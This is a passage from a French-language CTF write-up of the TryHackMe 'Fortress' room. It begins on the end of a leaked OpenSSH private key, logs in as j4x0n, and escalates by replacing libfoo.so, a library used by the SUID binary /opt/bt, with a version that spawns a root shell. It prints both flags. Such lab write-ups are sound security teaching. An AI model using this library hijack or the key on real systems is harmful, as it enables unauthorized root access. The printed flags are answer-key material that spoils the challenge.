OW7EGDleXvm7Z3cAZKgtHophpqvHjXt8f0oFQuFoLRWqlYJwAAAMEAzj9MAslAc0OoVF5P
kW4oGXnXLXYYAMacdc4J5DYeq18e1z/3fQ5h5fa25BgBJly5TLMs9m31sNG8FpchyEFMLu
mwDihPU8qwHhDJGkdvh/zCrfe07ujQvmnuenlFUGdgiQp0OPZgywFmuk+aaD59W1MRGcJe
cnNGvDhR/NMJ0YBfv029YdzwOgBtNqw7BSqyOS3mepKeE3bljs5LAa5gzMKK2S3BxK8boj
nFbP+PbGqbSogz+v28J/a1zOdLnio7AAAAwQDKFb8UhSYKVFp8m7DB6Ysu97quOLFjxqHs
AfmUmtgtfmgP+FN4YqeDfBP0BTjli4AW3Sas9ZgPeYgORwXqMflhcSMqQ/5zdVjw0iI09X
1QQR8Og910EY5W2KbvYuIbKbRrRZwYGPzJNjRqK/zNi4yAnDLayShx7p4ujAVy0rP2r9A2
rDuPscM6HPszTYfhci5eLlw25zN6fvYruh9DwNd3UQpgKh0XW+7kAThBOTpH67AtFqjYS9
k8ToMpypFXDO0AAAAOajR4MG5AMHZlcmZsYXcBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

On lit la clef privée de j4x0n.  

**What is the flag in user.txt?**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh -i j4x0n_id j4x0n@fortress
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

UA Infra: Extended Security Maintenance (ESM) is not enabled.

0 updates can be applied immediately.

39 additional security updates can be applied with UA Infra: ESM
Learn more about enabling UA Infra: ESM service for Ubuntu 16.04 at
https://ubuntu.com/16-04

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Jul 26 15:21:48 2021 from 192.168.150.128
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

j4x0n@fortress:~$ id
uid=1000(j4x0n) gid=1000(j4x0n) groups=1000(j4x0n),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
j4x0n@fortress:~$ ls
endgame.txt  user.txt
j4x0n@fortress:~$ cat user.txt 
84589a1bb8a932e46643b242a55489c0
j4x0n@fortress:~$ 
```

On se connecte sur compte de j4x0n et on lit le fichier user.txt.  
On a le flag qui est : 84589a1bb8a932e46643b242a55489c0   

**Escalate your privileges, what is the flag in root.txt?**  

```bash
j4x0n@fortress:~$ cat endgame.txt 
Bwahahaha, you're late my boi!! I have already patched everything... There's nothing you can exploit to gain root... Accept your defeat once and for all, and I shall let you leave alive.
```

On a un message qui nous dit que personne peut faire une exploitation pour être root.   

```bash
j4x0n@fortress:~$ find / -perm -4000 2>/dev/null
/usr/local/bin/sudo
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/at
/opt/bt
/bin/ping6
/bin/umount
/bin/ping
/bin/mount
/bin/su
/bin/fusermount
/sbin/ldconfig.real
``` 

Nous avons un fichier non commun dans /opt/bt qui est setuid.   

```bash
j4x0n@fortress:/opt$ ls
bt
```

Quand on exécute bt, il fait panter le terminal.  

```bash
j4x0n@fortress:/opt$ ldd bt
	linux-vdso.so.1 =>  (0x00007ffc2597e000)
	libfoo.so => /usr/lib/libfoo.so (0x00007f23957c3000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f23951e6000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f23955b0000)
```

On voit bt utilise la librairie libfoo.so.   

```bash
j4x0n@fortress:/opt$ cd /tmp
j4x0n@fortress:/tmp$ vi libfoo.c
j4x0n@fortress:/tmp$ cat libfoo.c 
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h> 
int foo() { 
setgid(0); 
setuid(0); 
system("/bin/bash"); 
}

j4x0n@fortress:/tmp$ gcc -fPIC -shared -o libfoo.so libfoo.c
j4x0n@fortress:/tmp$ cp libfoo.so /usr/lib/
```

On va remplace la librairie libfoo.so du systeme pas la notre qui exécute un shell.   

```bash
j4x0n@fortress:/opt$ ./bt
Root Shell Initialized...
Exploiting kernel at super illuminal speeds...
Getting Root...
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@fortress:/opt# cat /root/root.txt 
3a17cfcca1aabc245a2d5779615643ae
```

On exécute bt.  
bt appelle notre libraire qui exécute un shell.  
On a un shell root et on lit le fichier root.txt dans le répertoire root.    

Le flag est : 3a17cfcca1aabc245a2d5779615643ae  